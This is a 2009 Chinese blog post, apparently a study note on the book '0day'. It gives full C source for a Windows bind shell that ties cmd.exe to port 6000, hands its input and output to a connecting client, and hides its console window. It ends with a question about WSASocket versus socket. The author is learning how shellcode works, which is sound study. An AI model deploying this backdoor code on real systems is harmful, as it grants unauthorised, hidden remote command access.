---
layout: post
title: "绑定cmd到指定端口"
date: 2009-06-27  16:23
comments: true
categories: tech
tags: ["Vc"]
_baiduhi_id: 46c61bdf5b30ac1a622798b4.html
_baiduhi_category: Vc
---

(hplonline)2009.6.27<br/><br/>
例子来自《0day》5.6.3节。<br/>
由于原书直接上汇编，并且缩减得实在是太厉害，<br/>
不容易抓住主要脉络，所以自己想先用C实现一个再体会。<br/><br/>
绑定后在客户端用telnet软件就可以连接了。<br/><br/><div forimg="1"><img border="0" src="http://hiphotos.baidu.com/hplonline/pic/item/de161417c0da1e274b90a70d.jpg" small="0" class="blogimg"/></div>
<br/>
由于破vista把telnet.exe给阉割了。于是用这款SecureCRT。<br/>
可以管理多个会话，非常方便。<br/><br/><font color="#0000ff">代码（含详细注释）：</font><br/><br/>
#include &lt;winsock2.h&gt;<br/>
#include &lt;windows.h&gt;<br/>
#include &lt;stdio.h&gt;<br/>
#pragma comment(lib,"ws2_32.lib")<br/><br/>
char *app_name = "cmd.exe" ;<br/><br/>
int main(){<br/>
     WORD wVersionRequested;<br/>
     WSADATA wsaData;<br/>
     int err;<br/><br/>
     wVersionRequested = MAKEWORD( 1, 1 );<br/><br/>
     err = WSAStartup( wVersionRequested, &amp;wsaData);<br/>
     if (err!=0){<br/>
          return err;<br/>
     }<br/>
     <br/>
     if (LOBYTE ( wsaData.wVersion) != 1 ||<br/>
          HIBYTE ( wsaData.wVersion) != 1){<br/>
          WSACleanup();<br/>
          return 0;<br/>
     }<br/><br/>
     //以上部分属于“八股”的范畴，各种资料有讲相关的意思。<br/>
     //这里直接用了，很多时候做Socket编程都会写上这些话。<br/><br/>
     //得到服务端的socket<br/><font color="#ff0000">     SOCKET mySocket = WSASocketA(AF_INET , SOCK_STREAM , 0 , 0 , 0  , 0) ;<br/>
//     SOCKET mySocket = socket(AF_INET , SOCK_STREAM , 0 ) ;</font><br/>
     <br/>
     //生成地址结构，这里主要关注的是协议和端口<br/>
     //要注意的是htonx系列函数的使用否则得不到预期效果<br/>
     SOCKADDR_IN sa ;<br/>
     sa.sin_family = AF_INET ;<br/>
     sa.sin_addr.S_un.S_addr = htonl(ADDR_ANY) ;<br/>
     sa.sin_port = htons(6000) ;<br/>
     <br/>
     //绑定到端口<br/>
     bind(mySocket , (SOCKADDR*)&amp;sa , sizeof(sa)) ;<br/>
     <br/>
     //监听端口<br/>
     listen(mySocket , 5) ;<br/><br/>
     SOCKADDR_IN otherAddr ; //用来接收客户端地址<br/>
     int len ; //。。由于accept最后一个参数要传指针。。。。<br/>
     SOCKET otherSocket ;<br/>
     len = sizeof(otherAddr) ;<br/><br/>
     otherSocket = accept(mySocket , (SOCKADDR*)&amp;otherAddr , &amp;len) ;<br/><br/>
     //用于进程启动的信息<br/>
     STARTUPINFO si ;<br/>
     memset(&amp;si , 0 , sizeof(si)) ;<br/>
     //长度信息，很重要，否则结构里的内容会全部忽视<br/>
     si.cb = sizeof(STARTUPINFO) ;<br/>
     //这里设置三个标准句柄<br/>
     si.hStdError = (void*)otherSocket ;<br/>
     si.hStdInput = (void*)otherSocket ;<br/>
     si.hStdOutput = (void*)otherSocket ;<br/>
     //如果没有这个标志的话，以上指定的句柄会被忽略<br/>
     si.dwFlags = STARTF_USESTDHANDLES ;<br/><br/>
     //用来接收进程信息<br/>
     PROCESS_INFORMATION pi ;<br/><br/>
     //创建进程<br/>
     CreateProcess(NULL , app_name , NULL , NULL , TRUE , NULL , NULL , NULL , &amp;si , &amp;pi) ;<br/><br/>
     //这节用来隐藏窗口<br/>
     SetConsoleTitle("hplonline") ;<br/>
     HWND hWnd = FindWindow(NULL , "hplonline") ;<br/>
     ShowWindow(hWnd , SW_HIDE);<br/><br/>
     //用来等待直到创建的cmd结束为止<br/>
     WaitForSingleObject( pi.hProcess, INFINITE );<br/>
     CloseHandle(pi.hProcess) ;<br/>
     CloseHandle(pi.hThread) ;<br/><br/>
     //这个也是“八股”的范畴<br/>
     WSACleanup();<br/>
     return 0 ;<br/>
}<br/><br/><font color="#0000ff">很诡异的问题：</font><br/><br/>
下面这句换成后面注释过的，就没有任何效果了。<br/>
     SOCKET mySocket = WSASocketA(AF_INET , SOCK_STREAM , 0 , 0 , 0  , 0) ;<br/>
//     SOCKET mySocket = socket(AF_INET , SOCK_STREAM , 0 ) ;<br/><br/>
MSDN上给WSASocket的解释中有一句：<br/>
If<em> lpProtocolInfo</em> is NULL, the WS2_32.DLL uses the first three parameters  (<em>af, type, protocol</em>) to determine ……<br/><br/>
就是说，按照这样样的参数传进去，后面的都会忽略。<br/>
相当于给socket传了同样的内容过去。<br/>
但用socket却没有任何效果。<br/><br/>
网上搜了不少地方，只看到有的说：<br/>
socket符合unix标准，用于同步传输<br/>
WSASocket指定更多的，如IO重叠等特性<br/><br/>
但不管怎么说，这里并没有给WSASocket指定更多的信息啊。。
